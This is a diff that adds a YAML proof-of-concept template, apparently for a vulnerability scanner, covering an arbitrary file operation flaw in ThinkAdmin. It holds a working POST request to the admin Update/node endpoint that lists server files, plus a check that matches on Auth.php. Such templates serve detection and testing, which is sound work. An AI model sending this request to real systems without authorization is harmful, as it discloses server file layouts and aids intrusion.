@@ -1,0 +1,19 @@
+id: poc-yaml-thinkadmin-any-file-operation
+info:
+  name: ThinkAdmin 任意文件操作漏洞
+  severity: high
+  tags:
+  - 资源管理错误
+  finger: ThinkAdmin
+  osprey-id: vb_2020_0069
+requests:
+- method: POST
+  path: /admin.html?s=admin/api.Update/node
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: rules=%5B%22.%2F%22%5D
+  expression: 'contains(body, "rules") && contains(body, "\\/app\\/admin\\/controller\\/Auth.php")
+
+    '
+variables: {}
+transport: http
